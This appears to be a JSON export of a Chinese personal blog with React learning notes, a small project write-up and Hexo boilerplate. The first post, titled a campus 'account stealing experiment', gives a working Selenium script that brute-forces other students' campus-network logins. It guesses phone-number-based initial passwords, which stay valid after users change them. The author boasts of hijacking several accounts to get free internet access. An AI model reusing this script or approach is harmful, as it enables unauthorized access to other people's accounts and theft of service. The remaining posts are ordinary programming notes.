[{"title":"记一次校园盗号实验","date":"2019-10-11T05:53:56.952Z","updated":"2019-10-11T06:53:34.300Z","content":"在大学中网络是个大问题，大部分的学校都是用的校园网上网，登录方式一般是连接上wifi后打开校园网登录界面，登录成功后才有正常网络，我所在学校的校园网登录界面是这样的：\n\n往下翻公告显示：\n\n一次偶然机会发现即时用户更改了初始密码后，登录时使用原初始密码仍然能够登录成功，并且一个账号能够登录两个终端，所以我就抱着能省就省的态度产生一个想法，用Python的自动化测试selenium硬破解账号密码登录上网。\n因为初始密码是手机后6位，就比较方便测试，随机给定一个号码递增依次连接，成功了就能正常上网了。\n以下是实验过程：\n查看源代码，找到用户名input标签的id，这里开发人员用了两层input来掩盖真正的input，获取真正input的id\n\n密码input也是一样，\n\n在Python 3.7中下载selenium：命令 pip install -U selenium ；\n以下是源代码：\n123456789101112131415161718192021222324252627282930313233343536373839# -*-coding:utf8-*-import timeimport randomfrom selenium import webdriverfrom selenium.webdriver.common.keys import Keysdriver = webdriver.Chrome(executable_path='chromedriver.exe')        # 设置浏览器窗口driver.set_window_size(1080, 800)driver.get('http://10.100.255.2')zhanghao = 15281demo = random.randrange(1000, 9999)//随机一个尾号mima = 730000 + demoz = mimaprint('请断开网络后运行')print('正在硬破解请等待.........')time.sleep(4)while 1:    try:        driver.find_element_by_id(\"username\").send_keys(Keys.CONTROL+\"a\")\t\t//选中用户名输入框全选        driver.find_element_by_id(\"username\").send_keys(str(zhanghao)+str(mima))        //输入号码        time.sleep(1)        if mima == z:                driver.find_element_by_id(\"pwd_tip\").click()        driver.find_element_by_id(\"pwd\").click()        driver.find_element_by_id(\"pwd\").send_keys(Keys.CONTROL + \"a\")\t\t//选中密码输入框全选        driver.find_element_by_id(\"pwd\").send_keys(str(mima))\t\t//输入密码        driver.find_element_by_id(\"pwd\").send_keys(Keys.ENTER)        //登录        mima = mima + 1        //号码加1    except Exception:        print('已登录成功！！！！')\n\n需要注意chrome浏览器版本对应Chromedriver版本，不然打不开chrome浏览器。\n最后成功扫到了几个账号，能够顺利上网了开森！\n","plink":"/2019/10/11/记一次校园盗号实验/"},{"title":"小项目开发文档","date":"2019-10-08T01:33:21.250Z","updated":"2019-10-08T01:42:19.213Z","content":"一.概述该项目属于个人学习开发项目，学习网络资源存储和网络API的应用。\n二.开发环境React（16.8.6）+Fetch+animate.css+APlayer+PHP（7.3.1）+Slim（3）+Xampp（3.2.2）+OOS对象存储服务\n三.UI设计1.首页\n2.影院页面\n3.文章页面\n\n4.歌单页面\n四.主要技术1.Reacthttps://reactjs.org/\n2.Fetch12345678910fetch(\"http://127.0.0.1:8000/solvemovies/\", &#123;      method: \"GET\",      headers: &#123;        \"Content-Type\": \"application/json\"      &#125;,      mode: \"cors\"    &#125;)      .then(response =&gt; response.json())      .then(data =&gt; &#123;&#125;)      .then(response =&gt; response, error =&gt; error);\n\n3.OOS12345678910111213141516171819202122function oosget($object)&#123;    $accessKeyId = \"**************\";    $accessKeySecret = \"******************\";// Endpoint以杭州为例，其它Region请按实际情况填写。    $endpoint = \"http://oss-cn-hangzhou.aliyuncs.com\";    $bucket= \"********\";    //$securityToken = \"&lt;yourSecurityToken&gt;\";// 设置URL的有效期为3600秒。    $timeout = 3600;    try &#123;        $ossClient = new OssClient($accessKeyId, $accessKeySecret, $endpoint);        // 生成GetObject的签名URL。        $signedUrl = $ossClient-&gt;signUrl($bucket, $object, $timeout);        return $signedUrl;    &#125; catch (OssException $e) &#123;        printf(__FUNCTION__ . \": FAILED\\n\");        printf($e-&gt;getMessage() . \"\\n\");        return;    &#125;&#125;\n\n4.APIHitokoto-一言    url：https://v1.hitokoto.cn/?c=f&amp;encode=text\n每日一文    url：https://interface.meiriyiwen.com/article/today?dev=1\n特定某天一文    url：https://interface.meiriyiwen.com/article/day?dev=1&amp;date= + 日期\nurl 示例：https://interface.meiriyiwen.com/article/day?dev=1&amp;date=20170216\n5.APlayerhttps://aplayer.js.org/#/\nhttps://aplayer.js.org/#/home\n五.总结通过此项目学习网络资源存储和API的应用，对Fetch、Http有更深入的了解，明白了请求的用法与应用。\n进一步熟悉ReactJs……\n","plink":"/2019/10/08/小项目开发文档/"},{"title":"React学习（2）","date":"2019-10-08T01:32:22.916Z","updated":"2019-10-08T01:39:08.120Z","content":"React高阶组件高阶组件定义\na higher-order component is a function that takes a component and returns a new component.\n\n翻译：高阶组件就是一个函数，且该函数接受一个组件作为参数，并返回一个新的组件。\n理解了吗？看了定义似懂非懂？继续往下看。\n函数模拟高阶组件我们通过普通函数来理解什么是高阶组件哦~\n\n最普通的方法，一个welcome，一个goodbye。两个函数先从localStorage读取了username，然后对username做了一些处理。\n\n123456789101112function welcome() &#123;    let username = localStorage.getItem('username');    console.log('welcome ' + username);&#125;function goodbey() &#123;    let username = localStorage.getItem('username');    console.log('goodbey ' + username);&#125;welcome();goodbey();\n\n\n我们发现两个函数有一句代码是一样的，这叫冗余唉。不好不好~（你可以把那一句代码理解成平时的一大堆代码）\n我们要写一个中间函数，读取username,他来负责把username传递给两个函数。\n\n\n123456789101112131415161718192021function welcome(username) &#123;    console.log('welcome ' + username);&#125;function goodbey(username) &#123;    console.log('goodbey ' + username);&#125;function wrapWithUsername(wrappedFunc) &#123;    let newFunc = () =&gt; &#123;        let username = localStorage.getItem('username');        wrappedFunc(username);    &#125;;    return newFunc;&#125;welcome = wrapWithUsername(welcome);goodbey = wrapWithUsername(goodbey);welcome();welcome();\n\n好了，我们里面的wrapWithUsername函数就是一个“高阶函数”。他做了什么？他帮我们处理了username，传递给目标函数。我们调用最终的函数welcome的时候，根本不用关心username是怎么来的。\n我们增加个用户study函数。\n123456function study(username)&#123;    console.log(username+' study');&#125;study = wrapWithUsername(study);study();\n\n这里你是不是理解了为什么说wrapWithUsername是高阶函数？我们只需要知道，用wrapWithUsername包装我们的study函数后，study函数第一个参数是username。\n我们写平时写代码的时候，不用关心wrapWithUsername内部是如何实现的。\n高阶组件（HOC）高阶组件就是一个没有副作用的纯函数。\n我们把上一节的函数统统改成react组件。\n\n最普通的组件哦。\n\nwelcome函数转为react组件。\n12345678910111213141516171819202122232425import React, &#123;Component&#125; from 'react'class Welcome extends Component &#123;    constructor(props) &#123;        super(props);        this.state = &#123;            username: ''        &#125;    &#125;    componentWillMount() &#123;        let username = localStorage.getItem('username');        this.setState(&#123;            username: username        &#125;)    &#125;    render() &#123;        return (            &lt;div&gt;welcome &#123;this.state.username&#125;&lt;/div&gt;        )    &#125;&#125;export default Welcome;\n\ngoodbey函数转为react组件。\n12345678910111213141516171819202122232425import React, &#123;Component&#125; from 'react'class Goodbye extends Component &#123;    constructor(props) &#123;        super(props);        this.state = &#123;            username: ''        &#125;    &#125;    componentWillMount() &#123;        let username = localStorage.getItem('username');        this.setState(&#123;            username: username        &#125;)    &#125;    render() &#123;        return (            &lt;div&gt;goodbye &#123;this.state.username&#125;&lt;/div&gt;        )    &#125;&#125;export default Goodbye;\n\n\n现在你是不是更能看到问题所在了？两个组件大部分代码都是重复的唉。\n\n按照上一节wrapWithUsername函数的思路，我们来写一个高阶组件(高阶组件就是一个函数，且该函数接受一个组件作为参数，并返回一个新的组件)。\n12345678910111213141516171819202122232425import React, &#123;Component&#125; from 'react'export default (WrappedComponent) =&gt; &#123;    class NewComponent extends Component &#123;        constructor() &#123;            super();            this.state = &#123;                username: ''            &#125;        &#125;        componentWillMount() &#123;            let username = localStorage.getItem('username');            this.setState(&#123;                username: username            &#125;)        &#125;        render() &#123;            return &lt;WrappedComponent username=&#123;this.state.username&#125;/&gt;        &#125;    &#125;    return NewComponent&#125;\n\n这样我们就能简化Welcome组件和Goodbye组件。\n123456789101112131415161718192021222324252627282930import React, &#123;Component&#125; from 'react';import wrapWithUsername from 'wrapWithUsername';class Welcome extends Component &#123;    render() &#123;        return (            &lt;div&gt;welcome &#123;this.props.username&#125;&lt;/div&gt;        )    &#125;&#125;Welcome = wrapWithUsername(Welcome);export default Welcome;import React, &#123;Component&#125; from 'react';import wrapWithUsername from 'wrapWithUsername';class Goodbye extends Component &#123;    render() &#123;        return (            &lt;div&gt;goodbye &#123;this.props.username&#125;&lt;/div&gt;        )    &#125;&#125;Goodbye = wrapWithUsername(Goodbye);export default Goodbye;\n\n看到没有，高阶组件就是把username通过props传递给目标组件了。目标组件只管从props里面拿来用就好了。\n","plink":"/2019/10/08/React学习（2）/"},{"title":"React学习（1）","date":"2019-10-08T01:31:45.005Z","updated":"2019-10-08T01:38:59.175Z","content":"展示组件 &amp; 容器组件写React应用时，我发现了一种简单而有效的模式。如果你也写过一阵子React，或许你也已经发现它了。对于这种模式我还想再补充几点。\n如果把组件 分为以下两类，对组件的复用和理解会更容易一些。我这两类组件称为 展示组件和容器组件。也有叫“胖的&amp;瘦的”、“聪明的&amp;笨的”、“包含状态的的&amp;纯的”、“Screens and Components”的等等说法，这些说法并不完全一致，但核心理念大概相同。\n展示组件的特性：\n负责外观的展示\n可能同时包含展示组件 &amp; 容器组件，通常带有自身的 DOM标签 和 样式属性\n通常可以通过 this.props.children 包含组件\n不依赖应用中的其他组件，如FLUX的 actions 或 stores\n对于如何加载、修改数据，不做具体规定\n仅通过props来接收数据 和 回调函数\n几乎没有自身的状态（就是有，也是UI状态，而不是数据）\n除非组件需要状态、生命周期钩子(lifecycle hooks)、或者性能优化，否则一般写为函数式组件\n例如 Page, Sidebar, Story, UserInfo, List.\n\n容器组件的特性\n负责功能的实现\n可能同时包含展示组件 &amp; 容器组件，但通常自身不带有任何DOM标签（起包裹作用的div除外），也不带有任何样式属性\n向 展示组件 和 其他容器组件 提供数据和行为/方法\n调用Flux的actions，并将其作为回调函数，提供给展示组件\n通常是包含状态的，因为经常把它们作为数据源使用。\n通常不是手写的，而是用高阶组件生成的。高阶组件HOC，如React Redux 的connect() ，Relay的createContainer() 或者 Flux Utils的 Container.create() 等）\n例如：UserPage, FollowersSidebar, StoryContainer, FollowedUserList.\n\n为了让这种区分更加明显，我会把这两类组件放到不同的目录里。\n这么做的好处\n两类组件各司其职。由此，你对该APP/UI的理解会更加深入。\n更好的复用性。对完全不同的状态源，你可以使用同一个展示组件，并将其变为不同的、可进一步复用的容器组件。\n展示组件其实就是APP的“调色板”。你可以把它们放到一个单独的页面上，交给设计师，随便他怎么折腾，APP的逻辑和功能都不会受到一丝影响。你可以在这个页面上进行screenshot regression测试。\n迫使你从APP里“提炼”出“布局组件”，如Sidebar, Page, ContextMenu等。由此，你将不得不使用this.props.children，而非在若干容器组件内 重复使用一套布局相关的代码。\n\n请注意，组件并不一定需要生成DOM。They only need to provide composition boundaries between UI concerns.它们只需要提供UI之间的分界与组合关系。\n好好利用这一点。\n何时引入容器组件？在刚开始写APP的时候，我建议你只写展示组件。先就这么写着，总会有一个时刻，你将注意到，有太多的属性需要传递给中间层的组件。有些组件根本用不上这些属性，传给它们的目的，仅仅是为了能继续向下传递属性。而且，当子组件需要更多的数据时，你不得不重写中间层的组件。当你意识到这些时，就是引入容器组件的好时机。通过使用容器组件，无需途径组件树中其他无关的组件，就可以直接将数据和方法属性传给末端的叶子组件中。\n这种重构的过程是渐进的，别想着一步到位。随着你对这种模式日复一日地练习，对于何时使用容器组件，你会慢慢培养出一种直觉。这种感觉就像你知道啥时候应该抽象出函数一样。\n","plink":"/2019/10/08/React学习（1）/"},{"title":"关于React学习","date":"2019-10-02T08:09:06.918Z","updated":"2019-10-03T09:36:15.436Z","content":"React是一种js的集成库，页面由组件构成，交互性很高，灵活。\nReactJs写法有三种：\n1.直接在html中嵌入reactjs\n2.在js文件中编写\n3.在jsx中编写，需要js返回事件\n\nReactJs中注意事项：\nreact中state为节点属性可修改，props为节点参数，只读不可修改。\n\nstate的值修改麻烦。例如数组[ ] 用赋值修改\n\n父组件与子组件之间的数据传输：\n\n父传子利用props\n\n子传父利用参数函数回调\n\nrender（）渲染：页面不断render（）渲染可能会造成数据冗杂，性能降低。\n\ncomponentWillMount：在渲染前调用，在客户端也在服务端。\n\ncomponentDidMount：在第一次渲染后调用，只在客户端。之后组件已经生成了对应的DOM结构，可以通过this.getDOMNode（）来进行访问。如果你想和其他JavaScript框架一起使用，可以在这个方法中调用setTimeout，setInterval或者发送AJAX请求等操作（防止异步操作阻塞UI）。\n\ncomponentWillReceiveProps：在组件接收到一个新的prop（更新后）时被调用。这个方法在初始化渲染时不会被调用。\n\nshouldComponentUpdate：返回一个布尔值。在组件接收到新的道具或者状态时被调用。在初始化时或者使用forceUpdate时不被调用。可以在你确认不需要更新组件时使用。\n\ncomponentWillUpdate：在组件接收到新的道具或者状态但还没有渲染时被调用。在初始化时不会被调用。\n\ncomponentDidUpdate：在组件完成更新后立即调用。在初始化时不会被调用。\n\ncomponentWillUnmount：在组件从DOM中移除之前立刻被调用。\n\nstate 状态最大只能有两层深度。\n\n每次 state 值改变则会 render 。\n\njs 中参数类型只能是值，三大引用类型：1.Object类型   2.Array类型   3. Function类型\n\n\n","plink":"/2019/10/02/关于React学习/"},{"title":"Hello World","date":"2019-10-01T05:08:36.182Z","updated":"2019-10-08T01:39:39.344Z","content":"Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub.\nQuick StartCreate a new post1$ hexo new \"My New Post\"\n\nMore info: Writing\nRun server1$ hexo server\n\nMore info: Server\nGenerate static files1$ hexo generate\n\nMore info: Generating\nDeploy to remote sites1$ hexo deploy\n\nMore info: Deployment\n","plink":"/2019/10/01/hello-world/"},{"title":"","date":"2019-10-03T09:29:19.849Z","updated":"2019-10-03T09:29:19.849Z","content":"这家伙很懒，什么也没写。\n","plink":"/about/"}]